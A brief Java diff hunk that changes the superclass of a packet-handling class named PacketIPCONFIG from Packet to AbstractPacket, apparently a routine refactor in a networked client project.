@@ -7,7 +7,7 @@ import com.redpois0n.Connection;
 import com.redpois0n.common.os.OperatingSystem;
 
 
-public class PacketIPCONFIG extends Packet {
+public class PacketIPCONFIG extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
